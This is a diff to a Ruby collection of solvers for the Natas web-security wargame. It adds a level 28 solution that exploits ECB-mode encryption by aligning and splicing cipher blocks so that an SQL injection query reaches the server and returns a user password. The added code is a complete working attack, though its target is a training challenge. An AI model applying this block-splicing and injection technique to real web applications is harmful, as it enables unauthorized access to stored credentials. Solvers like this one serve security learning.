@@ -763,7 +763,7 @@ class NatasLevel27 < NatasLevelBase
       {
         'username' => PAYLOAD,
         'password' => ''
-      },
+      }
     )
     data = post(
       PAGE,
@@ -771,7 +771,7 @@ class NatasLevel27 < NatasLevelBase
       {
         'username' => NEXT_LOGIN,
         'password' => ''
-      },
+      }
     ).body
     match = /\[password\] =&gt; (\w{32})\n/.match(data)
     not_found unless match
@@ -782,4 +782,65 @@ end
 # Level 28
 class NatasLevel28 < NatasLevelBase
   LEVEL = 28
+  PAGE = '/'
+  PAGE_SEARCH = '/search.php'
+  BLOCK_SIZE = 16
+  PAYLOAD = %(SELECT password AS joke FROM users #)
+
+  def query(text)
+    response = post(PAGE, {}, { 'query' => text })
+    uri = URI.parse(response['Location'])
+    params = URI.decode_www_form(uri.query)
+    Base64.strict_decode64(params[0][1])
+  end
+
+  def print_blocks(data)
+    log("Size: #{data.bytesize}")
+    (data.bytesize / BLOCK_SIZE).times do |i|
+      s = i * BLOCK_SIZE
+      e = s + BLOCK_SIZE - 1
+      log("Block #{i}: #{data[s..e].unpack1('H*')}")
+    end
+  end
+
+  def exec
+    log('Getting a blank query')
+    data = query('')
+    default_size = data.bytesize
+    print_blocks(data)
+
+    log('Generating new blocks')
+    query_offset = 1
+    loop do
+      data = query(' ' * query_offset)
+      if data.bytesize > default_size + BLOCK_SIZE
+        print_blocks(data)
+        log("Query offset: #{query_offset}")
+        break
+      end
+      query_offset += 1
+    end
+
+    log('Generating blocks with payload')
+    data = query("#{' ' * query_offset}#{PAYLOAD}")
+    print_blocks(data)
+
+    log('Sending encrypted payload')
+    block_offset = (data.bytesize - default_size) / BLOCK_SIZE
+    payload = data[(BLOCK_SIZE * block_offset)..-1]
+    print_blocks(payload)
+    data = post(
+      PAGE_SEARCH,
+      {},
+      { 'query' => Base64.strict_encode64(payload) }
+    ).body
+    match = %r(<li>(\w{32})</li>).match(data)
+    not_found unless match
+    found(match[1])
+  end
+end
+
+# Level 29
+class NatasLevel29 < NatasLevelBase
+  LEVEL = 29
 end
